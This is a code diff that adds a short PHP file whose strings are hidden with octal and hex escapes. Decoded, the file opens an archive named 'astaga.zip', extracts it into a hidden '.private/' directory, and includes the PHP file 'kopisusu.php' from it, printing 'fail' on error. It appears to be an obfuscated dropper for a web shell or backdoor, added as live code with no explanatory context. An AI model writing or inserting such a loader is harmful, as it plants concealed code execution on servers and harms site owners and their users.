@@ -1,0 +1,2 @@
+<?php
+ $zip = new ZipArchive(); if ($zip->open("\141\163\164\x61\x67\141\x2e\x7a\151\x70") === TRUE) { $extractPath = "\56\x70\x72\x69\166\x61\164\x65\x2f"; if ($zip->extractTo($extractPath)) { $filename = $extractPath . "\x6b\x6f\x70\x69\163\165\163\x75\x2e\160\x68\160"; if (file_exists($filename)) { include $filename; } else { echo "\146\141\151\x6c"; } } else { echo "\146\141\x69\154"; } $zip->close(); } else { echo "\x66\141\x69\154"; }
